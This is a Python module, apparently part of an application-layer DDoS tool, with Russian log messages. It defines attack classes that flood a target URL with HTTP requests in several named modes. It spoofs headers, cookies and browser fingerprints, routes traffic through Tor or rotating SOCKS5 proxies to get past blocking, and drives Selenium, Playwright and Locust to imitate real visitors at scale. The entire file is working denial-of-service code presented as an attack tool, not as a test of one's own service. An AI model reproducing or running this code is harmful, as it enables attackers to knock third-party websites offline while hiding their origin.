import asyncio
import time
import aiohttp
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from playwright.async_api import async_playwright
from ..config import Config, logger
from ..utils.spoofing import generate_spoofed_headers, generate_cookies, spoof_fingerprint
from ..utils.proxy import get_async_tor_connector, get_random_proxy
import threading

class Layer7Attack:
    def __init__(self, target_url, duration, attack_type):
        self.target_url = target_url
        self.duration = duration
        self.attack_type = attack_type
        self.stop_event = asyncio.Event()

    async def stop(self):
        self.stop_event.set()

class HTTPAttack(Layer7Attack):
    async def run(self):
        async def http_flood(session):
            headers = generate_spoofed_headers()
            cookies = generate_cookies()
            proxy = get_random_proxy() if Config["use_proxy"] else None
            proxy_url = proxy['socks5'] if proxy else None
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                try:
                    if self.attack_type == 'HTTPS-FLOODER':
                        await session.get(self.target_url, headers=headers, cookies=cookies, ssl=False)
                    elif self.attack_type == 'HTTPS-BYPASS':
                        await session.get(self.target_url, headers=headers, cookies=cookies, proxy=proxy_url, ssl=False)
                    elif self.attack_type == 'HTTP-BROWSER':
                        await session.get(self.target_url, headers=generate_spoofed_headers())
                    elif self.attack_type == 'HTTPS-ARTERMIS':
                        await session.post(self.target_url, headers=headers, cookies=cookies, data={'key': 'value'}, ssl=False)
                    logger.info(f"{self.attack_type} запрос отправлен")
                except Exception as e:
                    logger.error(f"Ошибка в {self.attack_type}: {e}")
                await asyncio.sleep(0.1)
        
        connector = await get_async_tor_connector() if Config["use_tor"] else None
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [http_flood(session) for _ in range(Config['threads'])]
            await asyncio.gather(*tasks)

class BrowserAttack(Layer7Attack):
    def run_selenium_in_thread(self):
        options = Options()
        options.add_argument(f"user-agent={generate_spoofed_headers()['User-Agent']}")
        if Config["use_proxy"]:
            proxy = get_random_proxy()
            if proxy and 'socks5' in proxy:
                options.add_argument(f"--proxy-server={proxy['socks5']}")
        try:
            driver = webdriver.Chrome(options=options)
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                try:
                    driver.get(self.target_url)
                    if Config["browser_behavior"]["clicks"]:
                        driver.execute_script("let links = document.querySelectorAll('a'); if(links.length) links[0].click();")
                    if Config["browser_behavior"]["scroll"]:
                        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
                    logger.info(f"{self.attack_type} Selenium запрос отправлен")
                    time.sleep(Config["browser_behavior"]["delay"])
                except Exception as e:
                    logger.error(f"Ошибка в Selenium: {e}")
                    time.sleep(1)
            driver.quit()
        except Exception as e:
            logger.error(f"Ошибка при создании Selenium: {e}")

    async def run_playwright(self):
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True, proxy=get_random_proxy() if Config["use_proxy"] else None)
                page = await browser.new_page(**spoof_fingerprint())
                start_time = time.time()
                while time.time() - start_time < self.duration and not self.stop_event.is_set():
                    try:
                        await page.goto(self.target_url)
                        if Config["browser_behavior"]["clicks"]:
                            links = await page.query_selector_all('a')
                            if links:
                                await links[0].click()
                        if Config["browser_behavior"]["scroll"]:
                            await page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                        logger.info(f"{self.attack_type} Playwright запрос отправлен")
                        await asyncio.sleep(Config["browser_behavior"]["delay"])
                    except Exception as e:
                        logger.error(f"Ошибка в Playwright: {e}")
                        await asyncio.sleep(1)
                await browser.close()
        except Exception as e:
            logger.error(f"Ошибка при создании Playwright: {e}")

    async def run(self):
        if Config["use_browser"] == "selenium":
            await asyncio.gather(*(asyncio.to_thread(self.run_selenium_in_thread) for _ in range(Config['threads'])))
        elif Config["use_browser"] == "playwright":
            await asyncio.gather(*(self.run_playwright() for _ in range(Config['threads'])))

def get_locust_attack():
    from locust import HttpUser, task, between
    import time
    from ..config import Config, logger
    from ..utils.spoofing import generate_spoofed_headers, generate_cookies

    class LocustAttack(Layer7Attack):
        def run(self):
            class StressUser(HttpUser):
                wait_time = between(1, 3)
                host = self.target_url

                @task
                def stress(self):
                    try:
                        self.client.get("/", headers=generate_spoofed_headers(), cookies=generate_cookies())
                    except Exception as e:
                        logger.error(f"Ошибка в Locust: {e}")
            
            from locust.env import Environment
            env = Environment(user_classes=[StressUser])
            env.create_local_runner()
            env.runner.start(Config['threads'], spawn_rate=10)
            time.sleep(self.duration)
            env.runner.quit()
            logger.info("Locust атака завершена")
    
    return LocustAttack